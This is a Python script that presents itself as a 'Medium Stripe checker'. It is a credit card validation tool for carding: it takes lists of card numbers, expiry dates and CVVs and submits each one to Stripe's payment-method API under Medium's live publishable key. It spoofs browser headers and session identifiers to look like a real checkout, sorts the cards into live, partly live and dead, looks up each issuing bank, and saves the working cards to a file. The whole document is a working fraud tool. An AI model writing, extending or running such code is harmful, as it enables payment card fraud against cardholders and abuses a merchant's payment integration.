"""
Medium.com Card Checker for Pydroid3 v4.0
Stripe Auth Gate - Validates cards via Medium's Stripe
"""

import requests
import random
import string
import uuid
import time
import os
import re

# ============ CONFIG ============
INPUT_FILE = "cards.txt"
LIVE_FILE = "live.txt"
DEAD_FILE = "dead.txt"
DELAY = 2
# ================================

def get_bin_info(cc):
    try:
        r = requests.get(f'https://lookup.binlist.net/{cc[:6]}', timeout=10)
        if r.status_code == 200:
            d = r.json()
            return f"{d.get('scheme','?').upper()} - {d.get('type','?').upper()} | {d.get('bank',{}).get('name','?')} | {d.get('country',{}).get('name','?')} {d.get('country',{}).get('emoji','')}"
    except:
        pass
    return f"BIN: {cc[:6]}"

def check_card(cc, mes, ano, cvv):
    """Check card via Stripe payment method creation"""
    
    if len(str(ano)) == 4:
        ano = str(ano)[-2:]
    mes = str(mes).zfill(2)
    
    guid = str(uuid.uuid4()) + ''.join(random.choices('0123456789abcdef', k=6))
    muid = str(uuid.uuid4()) + ''.join(random.choices('0123456789abcdef', k=6))
    sid = str(uuid.uuid4()) + ''.join(random.choices('0123456789abcdef', k=6))
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid={guid}&muid={muid}&sid={sid}&payment_user_agent=stripe.js%2F83a1f53796%3B+stripe-js-v3%2F83a1f53796%3B+split-card-element&referrer=https%3A%2F%2Fmedium.com&time_on_page={random.randint(30000,60000)}&key=pk_live_7FReX44VnNIInZwrIIx6ghjl&_stripe_version=2025-03-31.basil'
    
    try:
        r = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
        resp = r.json()
    except Exception as e:
        return 'ERROR', str(e)
    
    if 'error' in resp:
        err = resp['error']
        code = err.get('code', '')
        decline = err.get('decline_code', '')
        msg = err.get('message', '')
        
        # LIVE card responses (card exists but has issues)
        live_codes = [
            'incorrect_cvc', 'invalid_cvc', 'incorrect_zip', 'insufficient_funds',
            'card_velocity_exceeded', 'do_not_honor', 'generic_decline', 
            'lost_card', 'stolen_card', 'expired_card', 'pickup_card',
            'restricted_card', 'security_violation', 'service_not_allowed',
            'transaction_not_allowed', 'try_again_later', 'card_declined',
            'withdrawal_count_limit_exceeded'
        ]
        
        if code in live_codes or decline in live_codes:
            return 'CCN', decline or code
        
        if 'invalid_number' in code or 'invalid' in msg.lower():
            return 'DEAD', code or msg
        
        if 'rate_limit' in code:
            return 'RATE', msg
        
        return 'DEAD', decline or code or msg
    
    # Payment method created = card is valid
    if 'id' in resp and resp['id'].startswith('pm_'):
        pm_id = resp['id']
        card_info = resp.get('card', {})
        brand = card_info.get('brand', 'unknown')
        funding = card_info.get('funding', 'unknown')
        checks = card_info.get('checks', {})
        cvc_check = checks.get('cvc_check', 'unknown')
        
        if cvc_check == 'pass':
            return 'LIVE', f'Approved - {brand.upper()} {funding.upper()}'
        elif cvc_check == 'fail':
            return 'CCN', f'CVC Failed - {brand.upper()}'
        else:
            return 'LIVE', f'Valid - {brand.upper()} {funding.upper()}'
    
    return 'DEAD', 'Unknown response'

def save_result(card, status, msg):
    if status in ['LIVE', 'CCN']:
        with open(LIVE_FILE, 'a') as f:
            f.write(f"{card}|{msg}\n")
    else:
        with open(DEAD_FILE, 'a') as f:
            f.write(f"{card}|{msg}\n")

def main():
    print("""
    ╔═══════════════════════════════════════╗
    ║      MEDIUM STRIPE CHECKER v4.0       ║
    ║           FOR PYDROID3                ║
    ║        Auth Gate - No Cookies         ║
    ╚═══════════════════════════════════════╝
    """)
    
    if not os.path.exists(INPUT_FILE):
        with open(INPUT_FILE, 'w') as f:
            f.write("# cc|mm|yy|cvv\n")
            f.write("# Example: 4111111111111111|12|25|123\n")
        print(f"[!] Created {INPUT_FILE} - add cards and run again")
        return
    
    with open(INPUT_FILE, 'r') as f:
        cards = [l.strip() for l in f if l.strip() and not l.startswith('#') and '|' in l]
    
    if not cards:
        print("[!] No cards in cards.txt")
        return
    
    print(f"[*] Loaded {len(cards)} cards")
    print(f"[*] Gate: Medium Stripe Auth")
    print(f"[*] Delay: {DELAY}s")
    print("=" * 45)
    
    live = ccn = dead = 0
    
    for i, card in enumerate(cards, 1):
        parts = card.split('|')
        if len(parts) < 4:
            continue
        
        cc, mes, ano, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
        full = f"{cc}|{mes}|{ano}|{cvv}"
        
        print(f"\n[{i}/{len(cards)}] {cc[:6]}xxxxxx{cc[-4:]}")
        
        start = time.time()
        status, msg = check_card(cc, mes, ano, cvv)
        t = round(time.time() - start, 2)
        
        bin_info = get_bin_info(cc)
        
        if status == 'LIVE':
            print(f"[LIVE] {full}")
            print(f"[+] {msg}")
            print(f"[+] {bin_info}")
            live += 1
            save_result(full, status, msg)
        elif status == 'CCN':
            print(f"[CCN] {full}")
            print(f"[+] {msg}")
            print(f"[+] {bin_info}")
            ccn += 1
            save_result(full, status, msg)
        elif status == 'RATE':
            print(f"[!] Rate limited - waiting 30s")
            time.sleep(30)
        else:
            print(f"[DEAD] {full}")
            print(f"[-] {msg}")
            dead += 1
            save_result(full, status, msg)
        
        print(f"[*] {t}s")
        
        if i < len(cards):
            time.sleep(DELAY)
    
    print("\n" + "=" * 45)
    print("            RESULTS")
    print("=" * 45)
    print(f"  LIVE:  {live}")
    print(f"  CCN:   {ccn}")
    print(f"  DEAD:  {dead}")
    print("=" * 45)
    print(f"Live cards saved to: {LIVE_FILE}")

if __name__ == "__main__":
    main()
